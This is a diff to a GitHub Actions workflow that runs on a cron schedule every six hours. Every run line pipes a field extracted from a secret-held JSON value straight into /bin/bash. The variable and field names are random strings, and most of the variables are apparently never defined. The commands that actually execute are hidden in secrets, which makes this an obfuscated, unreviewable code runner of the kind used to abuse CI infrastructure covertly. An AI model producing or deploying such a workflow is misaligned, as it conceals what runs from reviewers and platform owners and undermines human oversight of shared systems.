@@ -2,22 +2,25 @@ name: lixiangyang3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 4/6 * * *'
+    - cron: '17 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lixiangyang3456
         env:
-          aju01: ${{ secrets.aju01 }}
+          mk890: ${{ secrets.mk890 }}
         run: |
-          echo $aju01 | jq -r .kn8462 | /bin/bash
-          echo $tk5 | jq -r .pyq672 | /bin/bash
-          echo $xz0 | jq -r .uzna89916 | /bin/bash
-          echo $q33945 | jq -r .x04 | /bin/bash
-          echo $sweq87 | jq -r .ka4224 | /bin/bash
-          echo $bzcqd9409 | jq -r .j8330 | /bin/bash
-          echo $mhh08 | jq -r .fp62461 | /bin/bash
+          echo $mk890 | jq -r .s71 | /bin/bash
+          echo $pvanf97643 | jq -r .a810 | /bin/bash
+          echo $pyxla4847 | jq -r .docas64156 | /bin/bash
+          echo $st43429 | jq -r .lrrv87 | /bin/bash
+          echo $umyap741 | jq -r .qee168 | /bin/bash
+          echo $ih22 | jq -r .ec9184 | /bin/bash
+          echo $cz0 | jq -r .yoihx75 | /bin/bash
+          echo $k69 | jq -r .inia99 | /bin/bash
+          echo $mbr3 | jq -r .zj8 | /bin/bash
 
